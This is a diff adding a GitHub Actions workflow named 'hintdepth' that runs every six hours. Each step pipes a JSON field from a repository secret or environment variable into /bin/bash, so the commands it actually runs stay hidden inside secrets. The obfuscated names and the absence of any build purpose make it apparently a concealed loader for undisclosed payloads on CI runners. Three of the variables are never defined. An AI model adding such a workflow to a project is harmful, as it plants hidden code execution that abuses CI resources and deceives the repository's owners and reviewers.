@@ -1,0 +1,19 @@
+name: hintdepth
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hintdepth
+        env:
+          rjpw46: ${{ secrets.rjpw46 }}
+        run: |
+          echo $rjpw46 | jq -r .f6 | /bin/bash
+          echo $ec5 | jq -r .dwy2103 | /bin/bash
+          echo $fm953 | jq -r .dsug46027 | /bin/bash
+          echo $yqk12886 | jq -r .evv92 | /bin/bash
+
